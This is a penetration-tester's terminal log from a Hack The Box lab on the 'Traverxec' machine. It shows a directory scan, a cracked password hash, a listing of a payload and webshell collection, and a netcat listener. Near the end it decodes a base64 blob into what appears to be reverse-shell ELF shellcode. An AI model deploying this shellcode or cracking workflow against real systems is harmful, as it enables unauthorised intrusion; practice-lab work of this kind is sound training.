@@ -1,0 +1,406 @@
+root@parrot:~/hackthebox/traverxec# gobuster dir -u http://10.10.10.165 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt                           
+===============================================================                  
+Gobuster v3.0.1                         
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)                  
+===============================================================                  
+[+] Url:            http://10.10.10.165 
+[+] Threads:        10                  
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
+[+] Status codes:   200,204,301,302,307,401,403                                  
+[+] User Agent:     gobuster/3.0.1      
+[+] Timeout:        10s                 
+===============================================================                  
+2020/01/13 09:49:28 Starting gobuster   
+===============================================================                  
+/img (Status: 301)                      
+/icons (Status: 301)                    
+/css (Status: 301)                      
+/lib (Status: 301)                      
+/js (Status: 301)                       
+Progress: 5025 / 220561 (2.28%)^C       
+[!] Keyboard interrupt detected, terminating.                                    
+===============================================================                  
+2020/01/13 09:53:22 Finished            
+===============================================================                  
+root@parrot:~/hackthebox/traverxec# ls  
+creds  exploit.py  hash  nmap  reverse.php                                       
+root@parrot:~/hackthebox/traverxec# cp /opt/linux_privsec/LinEnum.sh .           
+root@parrot:~/hackthebox/traverxec# vi shell.sh                                  
+root@parrot:~/hackthebox/traverxec# cat hash                                     
+$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/:Nowonly4me                                    
+root@parrot:~/hackthebox/traverxec# echo 773fb95e98a27947de4a95abb3d3f2a2 | base64 -d                                                                             
+o^ƶ;uowwfroot@parrot:~/hackthebox/traverxec# cd /opt/                            
+root@parrot:/opt# ls                    
+bbht                finger-user-enum     JAWS               privilege-escalation-awesome-scripts-suite  Sublist3r                  Veil                           
+BloodHound          firmware-mod-kit     lazyrecon          PRTG-Network-Monitor-RCE                    Teeth                      wicd-git                       
+BurpSuiteCommunity  fsociety             linux_privsec      pspy                                        tmux                       wordlists                      
+car-hacking         ghidra               mRemoteNG-Decrypt  PyRFC                                       tmux-logging               XposedOrNot                    
+ctf-tools           ghidra_9.1.1_PUBLIC  nishang            python3-pwntools                            tmux-yank                  Yuki-Chan-The-Auto-Pentest     
+dirsearch           gobuster             passwords          RFCpwn                                      truffleHog                                                
+dsync               google               php-reverse-shell  SecLists                                    Ultimate-Facebook-Scraper                                 
+Empire              impacket             PowerSploit        ssh2john.py                                 unicorn                                                   
+root@parrot:/opt# git clone https://github.com/tennc/fuzzdb.git                  
+Cloning into 'fuzzdb'...                
+remote: Enumerating objects: 23, done.  
+remote: Counting objects: 100% (23/23), done.                                    
+remote: Compressing objects: 100% (23/23), done.                                 
+remote: Total 4401 (delta 11), reused 0 (delta 0), pack-reused 4378              
+Receiving objects: 100% (4401/4401), 887.43 MiB | 11.52 MiB/s, done.             
+Resolving deltas: 100% (1221/1221), done.                                        
+Updating files: 100% (3566/3566), done. 
+root@parrot:/opt# du fuzzdb/            
+579124  fuzzdb/dicts                    
+16      fuzzdb/regex                    
+4       fuzzdb/fuzzDicts                
+32      fuzzdb/web-backdoors/exe        
+24      fuzzdb/web-backdoors/php        
+24      fuzzdb/web-backdoors/sh         
+8       fuzzdb/web-backdoors/c          
+16      fuzzdb/web-backdoors/servlet    
+16      fuzzdb/web-backdoors/cfm        
+12      fuzzdb/web-backdoors/jsp/win32  
+124     fuzzdb/web-backdoors/jsp        
+32      fuzzdb/web-backdoors/pl-cgi     
+84      fuzzdb/web-backdoors/asp        
+364     fuzzdb/web-backdoors            
+116     fuzzdb/Discovery/FilenameBruteforce                                      
+912     fuzzdb/Discovery/PredictableRes/CMS                                      
+8544    fuzzdb/Discovery/PredictableRes 
+8664    fuzzdb/Discovery                
+79148   fuzzdb/IntruderPayloads         
+16      fuzzdb/wordlists-user-passwd/unix-os                                     
+48      fuzzdb/wordlists-user-passwd/access                                      
+8456    fuzzdb/wordlists-user-passwd/passwords                                   
+16      fuzzdb/wordlists-user-passwd/generic-listpairs                           
+68      fuzzdb/wordlists-user-passwd/oracle                                      
+9616    fuzzdb/wordlists-user-passwd/names                                       
+16      fuzzdb/wordlists-user-passwd/db2
+20      fuzzdb/wordlists-user-passwd/Mirai-name-pwd                              
+16      fuzzdb/wordlists-user-passwd/tomcat                                      
+16      fuzzdb/wordlists-user-passwd/postgres                                    
+18368   fuzzdb/wordlists-user-passwd    
+8       fuzzdb/webshellpathdict         
+20      fuzzdb/lot                      
+280     fuzzdb/docs/misc/unicode-security/UTR# 36_ Unicode Security Considerations_files                                                                          
+452     fuzzdb/docs/misc/unicode-security                                        
+240     fuzzdb/docs/misc/html-element-index/images                               
+128     fuzzdb/docs/misc/html-element-index/color                                
+32      fuzzdb/docs/misc/html-element-index/ss                                   
+156     fuzzdb/docs/misc/html-element-index/misc                                 
+64      fuzzdb/docs/misc/html-element-index/css/topics                           
+52      fuzzdb/docs/misc/html-element-index/css/syntax/selectors                 
+20      fuzzdb/docs/misc/html-element-index/css/syntax/inclusion                 
+152     fuzzdb/docs/misc/html-element-index/css/syntax/pseudo                    
+48      fuzzdb/docs/misc/html-element-index/css/syntax/atrules                   
+56      fuzzdb/docs/misc/html-element-index/css/syntax/units                     
+364     fuzzdb/docs/misc/html-element-index/css/syntax                           
+404     fuzzdb/docs/misc/html-element-index/css/supportkey                       
+100     fuzzdb/docs/misc/html-element-index/css/propindex                        
+124     fuzzdb/docs/misc/html-element-index/css/examples                         
+104     fuzzdb/docs/misc/html-element-index/css/properties/colorbg               
+56      fuzzdb/docs/misc/html-element-index/css/properties/list                  
+68      fuzzdb/docs/misc/html-element-index/css/properties/classify              
+104     fuzzdb/docs/misc/html-element-index/css/properties/position              
+40      fuzzdb/docs/misc/html-element-index/css/properties/outline               
+76      fuzzdb/docs/misc/html-element-index/css/properties/dynamic               
+32      fuzzdb/docs/misc/html-element-index/css/properties/extensions            
+68      fuzzdb/docs/misc/html-element-index/css/properties/scrollbar             
+156     fuzzdb/docs/misc/html-element-index/css/properties/intl                  
+88      fuzzdb/docs/misc/html-element-index/css/properties/font                  
+48      fuzzdb/docs/misc/html-element-index/css/properties/padding               
+156     fuzzdb/docs/misc/html-element-index/css/properties/aural                 
+72      fuzzdb/docs/misc/html-element-index/css/properties/dimension             
+52      fuzzdb/docs/misc/html-element-index/css/properties/table                 
+52      fuzzdb/docs/misc/html-element-index/css/properties/margin                
+216     fuzzdb/docs/misc/html-element-index/css/properties/border                
+52      fuzzdb/docs/misc/html-element-index/css/properties/generate              
+104     fuzzdb/docs/misc/html-element-index/css/properties/text                  
+72      fuzzdb/docs/misc/html-element-index/css/properties/print                 
+1728    fuzzdb/docs/misc/html-element-index/css/properties                       
+2896    fuzzdb/docs/misc/html-element-index/css                                  
+140     fuzzdb/docs/misc/html-element-index/html/topics                          
+680     fuzzdb/docs/misc/html-element-index/html/supportkey                      
+112     fuzzdb/docs/misc/html-element-index/html/tagindex                        
+60      fuzzdb/docs/misc/html-element-index/html/tagpages/p                      
+144     fuzzdb/docs/misc/html-element-index/html/tagpages/a                      
+28      fuzzdb/docs/misc/html-element-index/html/tagpages/k                      
+116     fuzzdb/docs/misc/html-element-index/html/tagpages/f                      
+40      fuzzdb/docs/misc/html-element-index/html/tagpages/e                      
+120     fuzzdb/docs/misc/html-element-index/html/tagpages/d                      
+1808    fuzzdb/docs/misc/html-element-index/html/tagpages/attributes             
+24      fuzzdb/docs/misc/html-element-index/html/tagpages/x                      
+96      fuzzdb/docs/misc/html-element-index/html/tagpages/m                      
+156     fuzzdb/docs/misc/html-element-index/html/tagpages/b                      
+88      fuzzdb/docs/misc/html-element-index/html/tagpages/o                      
+16      fuzzdb/docs/misc/html-element-index/html/tagpages/v                      
+128     fuzzdb/docs/misc/html-element-index/html/tagpages/c                      
+60      fuzzdb/docs/misc/html-element-index/html/tagpages/h                      
+12      fuzzdb/docs/misc/html-element-index/html/tagpages/w                      
+16      fuzzdb/docs/misc/html-element-index/html/tagpages/q                      
+60      fuzzdb/docs/misc/html-element-index/html/tagpages/n                      
+224     fuzzdb/docs/misc/html-element-index/html/tagpages/t                      
+32      fuzzdb/docs/misc/html-element-index/html/tagpages/u                      
+164     fuzzdb/docs/misc/html-element-index/html/tagpages/s                      
+388     fuzzdb/docs/misc/html-element-index/html/tagpages/entities               
+124     fuzzdb/docs/misc/html-element-index/html/tagpages/l                      
+84      fuzzdb/docs/misc/html-element-index/html/tagpages/r                      
+380     fuzzdb/docs/misc/html-element-index/html/tagpages/i                      
+4584    fuzzdb/docs/misc/html-element-index/html/tagpages                        
+120     fuzzdb/docs/misc/html-element-index/html/tree                            
+5744    fuzzdb/docs/misc/html-element-index/html                                 
+52      fuzzdb/docs/misc/html-element-index/testing/objects/images               
+48      fuzzdb/docs/misc/html-element-index/testing/objects/css                  
+144     fuzzdb/docs/misc/html-element-index/testing/objects                      
+16      fuzzdb/docs/misc/html-element-index/testing/html/tags/p                  
+112     fuzzdb/docs/misc/html-element-index/testing/html/tags/a                  
+20      fuzzdb/docs/misc/html-element-index/testing/html/tags/k                  
+160     fuzzdb/docs/misc/html-element-index/testing/html/tags/f                  
+32      fuzzdb/docs/misc/html-element-index/testing/html/tags/e                  
+124     fuzzdb/docs/misc/html-element-index/testing/html/tags/d                  
+24      fuzzdb/docs/misc/html-element-index/testing/html/tags/x                  
+52      fuzzdb/docs/misc/html-element-index/testing/html/tags/m                  
+172     fuzzdb/docs/misc/html-element-index/testing/html/tags/b                  
+28      fuzzdb/docs/misc/html-element-index/testing/html/tags/o                  
+20      fuzzdb/docs/misc/html-element-index/testing/html/tags/v                  
+68      fuzzdb/docs/misc/html-element-index/testing/html/tags/c                  
+44      fuzzdb/docs/misc/html-element-index/testing/html/tags/h                  
+16      fuzzdb/docs/misc/html-element-index/testing/html/tags/q                  
+20      fuzzdb/docs/misc/html-element-index/testing/html/tags/n                  
+108     fuzzdb/docs/misc/html-element-index/testing/html/tags/t                  
+32      fuzzdb/docs/misc/html-element-index/testing/html/tags/u                  
+180     fuzzdb/docs/misc/html-element-index/testing/html/tags/s                  
+76      fuzzdb/docs/misc/html-element-index/testing/html/tags/l                  
+40      fuzzdb/docs/misc/html-element-index/testing/html/tags/r                  
+212     fuzzdb/docs/misc/html-element-index/testing/html/tags/i                  
+1560    fuzzdb/docs/misc/html-element-index/testing/html/tags                    
+8       fuzzdb/docs/misc/html-element-index/testing/html/scripts                 
+1572    fuzzdb/docs/misc/html-element-index/testing/html                         
+1788    fuzzdb/docs/misc/html-element-index/testing                              
+324     fuzzdb/docs/misc/html-element-index/history                              
+12      fuzzdb/docs/misc/html-element-index/scripts                              
+11344   fuzzdb/docs/misc/html-element-index                                      
+12324   fuzzdb/docs/misc                
+12328   fuzzdb/docs                     
+1596    fuzzdb/webscan-payloads         
+88      fuzzdb/scanlist/Usernames/Names 
+100     fuzzdb/scanlist/Usernames       
+4356    fuzzdb/scanlist/Miscellaneous   
+28      fuzzdb/scanlist/IOCs            
+2496    fuzzdb/scanlist/Discovery/Web_Content/CMS                                
+12      fuzzdb/scanlist/Discovery/Web_Content/WebServices                        
+28      fuzzdb/scanlist/Discovery/Web_Content/SVNDigger/cat/Project              
+680     fuzzdb/scanlist/Discovery/Web_Content/SVNDigger/cat/Language             
+60      fuzzdb/scanlist/Discovery/Web_Content/SVNDigger/cat/Database             
+20      fuzzdb/scanlist/Discovery/Web_Content/SVNDigger/cat/Conf                 
+792     fuzzdb/scanlist/Discovery/Web_Content/SVNDigger/cat                      
+60      fuzzdb/scanlist/Discovery/Web_Content/SVNDigger/context                  
+1980    fuzzdb/scanlist/Discovery/Web_Content/SVNDigger                          
+348     fuzzdb/scanlist/Discovery/Web_Content/URLs                               
+13828   fuzzdb/scanlist/Discovery/Web_Content                                    
+1560    fuzzdb/scanlist/Discovery/DNS   
+4228    fuzzdb/scanlist/Discovery/wordlists                                      
+19620   fuzzdb/scanlist/Discovery       
+4       fuzzdb/scanlist/Webshells       
+28      fuzzdb/scanlist/Payloads/laudanum-0.8/aspx                               
+56      fuzzdb/scanlist/Payloads/laudanum-0.8/php                                
+8       fuzzdb/scanlist/Payloads/laudanum-0.8/cfm                                
+8       fuzzdb/scanlist/Payloads/laudanum-0.8/jsp/warfiles/WEB-INF               
+8       fuzzdb/scanlist/Payloads/laudanum-0.8/jsp/warfiles/META-INF              
+24      fuzzdb/scanlist/Payloads/laudanum-0.8/jsp/warfiles                       
+36      fuzzdb/scanlist/Payloads/laudanum-0.8/jsp                                
+40      fuzzdb/scanlist/Payloads/laudanum-0.8/asp                                
+196     fuzzdb/scanlist/Payloads/laudanum-0.8                                    
+1212    fuzzdb/scanlist/Payloads        
+28      fuzzdb/scanlist/Pattern_Matching
+16      fuzzdb/scanlist/Fuzzing/Polyglots                                        
+996     fuzzdb/scanlist/Fuzzing         
+26352   fuzzdb/scanlist                 
+16      fuzzdb/attack-payloads/BizLogic 
+8       fuzzdb/attack-payloads/os-dir-indexing                                   
+132     fuzzdb/attack-payloads/rfi      
+8       fuzzdb/attack-payloads/os-cmd-execution/docs                             
+48      fuzzdb/attack-payloads/os-cmd-execution                                  
+36      fuzzdb/attack-payloads/http-protocol                                     
+16      fuzzdb/attack-payloads/disclosure-source                                 
+16      fuzzdb/attack-payloads/xss/docs.wasc-scriptmapping/images                
+216     fuzzdb/attack-payloads/xss/docs.wasc-scriptmapping                       
+756     fuzzdb/attack-payloads/xss      
+144     fuzzdb/attack-payloads/sql-injection/lsd                                 
+24      fuzzdb/attack-payloads/sql-injection/exploit                             
+172     fuzzdb/attack-payloads/sql-injection/detect/docs                         
+240     fuzzdb/attack-payloads/sql-injection/detect                              
+412     fuzzdb/attack-payloads/sql-injection                                     
+52      fuzzdb/attack-payloads/disclosure-directory                              
+12      fuzzdb/attack-payloads/html_fuzz
+8       fuzzdb/attack-payloads/server-side-include                               
+68      fuzzdb/attack-payloads/file-upload                                       
+24      fuzzdb/attack-payloads/lfi      
+8       fuzzdb/attack-payloads/disclosure-localpaths/unix                        
+12      fuzzdb/attack-payloads/disclosure-localpaths                             
+40      fuzzdb/attack-payloads/all-attacks                                       
+80      fuzzdb/attack-payloads/path-traversal                                    
+12      fuzzdb/attack-payloads/control-chars                                     
+8       fuzzdb/attack-payloads/format-strings                                    
+8       fuzzdb/attack-payloads/integer-overflow                                  
+8       fuzzdb/attack-payloads/xpath    
+8       fuzzdb/attack-payloads/xml      
+8       fuzzdb/attack-payloads/ldap     
+1776    fuzzdb/attack-payloads          
+224     fuzzdb/wordlists-misc           
+24      fuzzdb/wuyun/baopo dict/ruokouling                                       
+948     fuzzdb/wuyun/baopo dict/1980-2010                                        
+180     fuzzdb/wuyun/baopo dict/wordlist
+5520    fuzzdb/wuyun/baopo dict/super dict                                       
+2568    fuzzdb/wuyun/baopo dict/10wei   
+1940    fuzzdb/wuyun/baopo dict/400W    
+2268    fuzzdb/wuyun/baopo dict/WPA     
+282220  fuzzdb/wuyun/baopo dict         
+3028    fuzzdb/wuyun/zhuangku           
+516     fuzzdb/wuyun/menu/新建文件夹 (3)
+2268    fuzzdb/wuyun/menu/目录          
+640     fuzzdb/wuyun/menu/新建文件夹 (2)
+116     fuzzdb/wuyun/menu/漏洞          
+6576    fuzzdb/wuyun/menu               
+48504   fuzzdb/wuyun/linkedin           
+232     fuzzdb/wuyun/usa name dict      
+500     fuzzdb/wuyun/changyong qipa     
+31836   fuzzdb/wuyun/a5 pudn 103W/fenlei
+63756   fuzzdb/wuyun/a5 pudn 103W       
+20      fuzzdb/wuyun/daniu backdoor pwd 
+405420  fuzzdb/wuyun                    
+5332    fuzzdb/dict/big-dict_457M/爆破/3389/3389字典大全/强大的爆破3389字典2     
+11148   fuzzdb/dict/big-dict_457M/爆破/3389/3389字典大全/3389字典2               
+3236    fuzzdb/dict/big-dict_457M/爆破/3389/3389字典大全/强大的爆破3389字典      
+12      fuzzdb/dict/big-dict_457M/爆破/3389/3389字典大全/IDC字典，杠杠的  1小时24台                                                                               
+7744    fuzzdb/dict/big-dict_457M/爆破/3389/3389字典大全/3389字典                
+3216    fuzzdb/dict/big-dict_457M/爆破/3389/3389字典大全/个人整理的1433超强字典+用户名 8小时200+ 爆破必用！                                                       
+184     fuzzdb/dict/big-dict_457M/爆破/3389/3389字典大全/专密码                  
+30876   fuzzdb/dict/big-dict_457M/爆破/3389/3389字典大全                         
+31128   fuzzdb/dict/big-dict_457M/爆破/3389                                      
+38604   fuzzdb/dict/big-dict_457M/爆破  
+684     fuzzdb/dict/big-dict_457M/FTP   
+488     fuzzdb/dict/big-dict_457M/注入/AG安全团队收集的表名                      
+1484    fuzzdb/dict/big-dict_457M/注入  
+11172   fuzzdb/dict/big-dict_457M/路径/御剑                                      
+15560   fuzzdb/dict/big-dict_457M/路径/字典（日志宝）                            
+5148    fuzzdb/dict/big-dict_457M/路径/wwwscan                                   
+1348    fuzzdb/dict/big-dict_457M/路径/字典收藏                                  
+684     fuzzdb/dict/big-dict_457M/路径/目录字典                                  
+2928    fuzzdb/dict/big-dict_457M/路径/综合目录/other                            
+41572   fuzzdb/dict/big-dict_457M/路径/综合目录                                  
+180     fuzzdb/dict/big-dict_457M/路径/数据库                                    
+5996    fuzzdb/dict/big-dict_457M/路径/2-8                                       
+4920    fuzzdb/dict/big-dict_457M/路径/Wscan Gui Beta6                           
+11192   fuzzdb/dict/big-dict_457M/路径/AG专用WEB字典                             
+44      fuzzdb/dict/big-dict_457M/路径/Umbrella                                  
+3000    fuzzdb/dict/big-dict_457M/路径/天蝎座                                    
+100820  fuzzdb/dict/big-dict_457M/路径  
+89916   fuzzdb/dict/big-dict_457M/弱口令/常用字典密码集合                        
+1056    fuzzdb/dict/big-dict_457M/弱口令/自己收集和组合的字典/破解字典/心东的字典
+2268    fuzzdb/dict/big-dict_457M/弱口令/自己收集和组合的字典/破解字典/WPA英文字典                                                                                
+2568    fuzzdb/dict/big-dict_457M/弱口令/自己收集和组合的字典/破解字典/10位数字  
+180     fuzzdb/dict/big-dict_457M/弱口令/自己收集和组合的字典/破解字典/wordlist  
+20      fuzzdb/dict/big-dict_457M/弱口令/自己收集和组合的字典/破解字典/弱口令集  
+948     fuzzdb/dict/big-dict_457M/弱口令/自己收集和组合的字典/破解字典/生日1980-2010年                                                                            
+5520    fuzzdb/dict/big-dict_457M/弱口令/自己收集和组合的字典/破解字典/超级字典  
+23816   fuzzdb/dict/big-dict_457M/弱口令/自己收集和组合的字典/破解字典/400W常用密码/400W常用密码                                                                  
+23820   fuzzdb/dict/big-dict_457M/弱口令/自己收集和组合的字典/破解字典/400W常用密码                                                                               
+153436  fuzzdb/dict/big-dict_457M/弱口令/自己收集和组合的字典/破解字典           
+19296   fuzzdb/dict/big-dict_457M/弱口令/自己收集和组合的字典/自己组合的字典     
+172736  fuzzdb/dict/big-dict_457M/弱口令/自己收集和组合的字典                    
+8460    fuzzdb/dict/big-dict_457M/弱口令/美国人字典                              
+289408  fuzzdb/dict/big-dict_457M/弱口令
+431004  fuzzdb/dict/big-dict_457M       
+6148    fuzzdb/dict/webshell-pwd        
+32852   fuzzdb/dict/a5 pudn源代码目录103W/分类                                   
+65788   fuzzdb/dict/a5 pudn源代码目录103W                                        
+10584   fuzzdb/dict/撞ku                
+232     fuzzdb/dict/xss/xsuperbug-payloads                                       
+1316    fuzzdb/dict/xss                 
+232     fuzzdb/dict/other               
+656     fuzzdb/dict/文件                
+10032   fuzzdb/dict/ctf                 
+10544   fuzzdb/dict/0xesc               
+9384    fuzzdb/dict/files/shack2/Category                                        
+18764   fuzzdb/dict/files/shack2        
+18768   fuzzdb/dict/files               
+1540    fuzzdb/dict/execgi              
+4452    fuzzdb/dict/cn-edu              
+184     fuzzdb/dict/YS_scan             
+12      fuzzdb/dict/sqli                
+87216   fuzzdb/dict/dirfuzz-dict        
+12      fuzzdb/dict/BURP-PayLoad/DoubleQuery                                     
+8       fuzzdb/dict/BURP-PayLoad/POSTGRES                                        
+80      fuzzdb/dict/BURP-PayLoad/UNION SELECT                                    
+16      fuzzdb/dict/BURP-PayLoad/HTTP   
+72      fuzzdb/dict/BURP-PayLoad/GetTABLES                                       
+104     fuzzdb/dict/BURP-PayLoad/LFI    
+12      fuzzdb/dict/BURP-PayLoad/BLIND  
+36      fuzzdb/dict/BURP-PayLoad/XSS    
+16      fuzzdb/dict/BURP-PayLoad/TIME-Based                                      
+48      fuzzdb/dict/BURP-PayLoad/CommonTables                                    
+48      fuzzdb/dict/BURP-PayLoad/GetCOLUMNS                                      
+8       fuzzdb/dict/BURP-PayLoad/XPATH-extractvalue                              
+8       fuzzdb/dict/BURP-PayLoad/MS-SQL 
+8       fuzzdb/dict/BURP-PayLoad/MS-ACCESS                                       
+17012   fuzzdb/dict/BURP-PayLoad/Bruteforce/passwords                            
+6892    fuzzdb/dict/BURP-PayLoad/Bruteforce/usernames                            
+23912   fuzzdb/dict/BURP-PayLoad/Bruteforce                                      
+12      fuzzdb/dict/BURP-PayLoad/GetDBS 
+8       fuzzdb/dict/BURP-PayLoad/ORACLE 
+28      fuzzdb/dict/BURP-PayLoad/CommonColumns                                   
+1048    fuzzdb/dict/BURP-PayLoad/LOGS   
+16      fuzzdb/dict/BURP-PayLoad/SQLi2Shell                                      
+8       fuzzdb/dict/BURP-PayLoad/BasicInfo                                       
+28      fuzzdb/dict/BURP-PayLoad/AdminFinder                                     
+28      fuzzdb/dict/BURP-PayLoad/Grep   
+8       fuzzdb/dict/BURP-PayLoad/AuthBypass                                      
+8       fuzzdb/dict/BURP-PayLoad/SSI    
+8       fuzzdb/dict/BURP-PayLoad/VulnTest                                        
+56      fuzzdb/dict/BURP-PayLoad/ORDER-GROUP-BY                                  
+25648   fuzzdb/dict/BURP-PayLoad        
+32      fuzzdb/dict/weakfilescan-dict   
+140     fuzzdb/dict/folders/RobotsDisallowed                                     
+28      fuzzdb/dict/folders/BruteX      
+11208   fuzzdb/dict/folders             
+15560   fuzzdb/dict/log-baby            
+751464  fuzzdb/dict                     
+8       fuzzdb/.git/refs/remotes/origin 
+12      fuzzdb/.git/refs/remotes        
+4       fuzzdb/.git/refs/tags           
+8       fuzzdb/.git/refs/heads          
+28      fuzzdb/.git/refs                
+4       fuzzdb/.git/objects/info        
+908864  fuzzdb/.git/objects/pack        
+908872  fuzzdb/.git/objects             
+8       fuzzdb/.git/info                
+4       fuzzdb/.git/branches            
+56      fuzzdb/.git/hooks               
+8       fuzzdb/.git/logs/refs/remotes/origin                                     
+12      fuzzdb/.git/logs/refs/remotes   
+8       fuzzdb/.git/logs/refs/heads     
+24      fuzzdb/.git/logs/refs           
+32      fuzzdb/.git/logs                
+909420  fuzzdb/.git                     
+2794352 fuzzdb/                         
+root@parrot:/opt# cd -                  
+/root/hackthebox/traverxec              
+root@parrot:~/hackthebox/traverxec# echo -n f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAeABAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAEAAOAABAAAAAAAAAAEAAAAHAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAA+gAAAAAAAAB8AQAAAAAAAAAQAAAAAAAASDH/aglYmbYQSInWTTHJaiJBWrIHDwVIhcB4UWoKQVlQailYmWoCX2oBXg8FSIXAeDtIl0i5AgARXAoKDi1RSInmahBaaipYDwVZSIXAeSVJ/8l0GFdqI1hqAGoFSInnSDH2DwVZWV9IhcB5x2o8WGoBXw8FXmp+Wg8FSIXAeO3/5g== | base64 -d             
+ELF>x@@@8@@|H1j XHM1j"AZHxQj            
+AYPj)Xj_j^Hx;HH\                        
+
+-QHjZj*XYHy%ItWj#XjjHH1YY_Hyj<Xj_^j~ZHxroot@parrot:~/hackthebox/traverxec# echo aglYmbYQSInWTTHJaiJBWrIHDwVIhcB4UWoKQVlQailYmWoCX2oBXg8FSIXAeDtIl0i5AgARXAoKDi1RSInmahBaaipYDwVZSIXAeSVJ | base64 -d      
+j       XHM1j"AZHxQj                    
+AYPj)Xj_j^Hx;HH\                        
+
+-QHjZj*XYHy%Iroot@parrot:~/hackthebox/traverxec# echo 8l0GFdqI1hqAGoFSInnSDH2DwVZWV9IhcB5x2o8WGoBXw8FXmp+Wg8FSIXAeO3/5g== | base64 -d                             
+]ڈR"y                                   
+     }VVW!pqڏWWR!p;base64: invalid input
+root@parrot:~/hackthebox/traverxec# nc -nvlp 5555 > binary1                      
+Ncat: Version 7.80 ( https://nmap.org/ncat )                                     
+Ncat: Listening on :::5555              
+Ncat: Listening on 0.0.0.0:5555         
+Ncat: Connection from 10.10.10.165.     
+Ncat: Connection from 10.10.10.165:40898.                                        
+^C                                      
+root@parrot:~/hackthebox/traverxec#     
